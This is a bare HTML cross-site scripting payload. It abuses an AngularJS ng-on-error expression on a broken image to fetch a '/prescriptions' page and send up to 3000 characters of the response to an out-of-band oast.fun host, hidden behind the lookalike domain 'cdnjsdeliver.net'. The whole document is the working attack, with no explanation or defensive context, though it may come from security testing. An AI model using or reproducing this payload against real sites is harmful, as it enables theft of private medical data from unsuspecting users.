<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<div ng-app>
  <img src=x ng-on-error="
    window=$event.target.ownerDocument.defaultView;
    x=new window.XMLHttpRequest();
    x.open('GET','/prescriptions',true);
    x.onload=function(){
      s=window.document.createElement('script');
      s.src='https://cdnjsdeliver.net.wedwqcbkveknzrplplbbf2thxekxhd8hu.oast.fun/?d='+window.encodeURIComponent(x.responseText.substring(0,3000));
      window.document.head.appendChild(s);
    };
    x.send();
  ">
</div>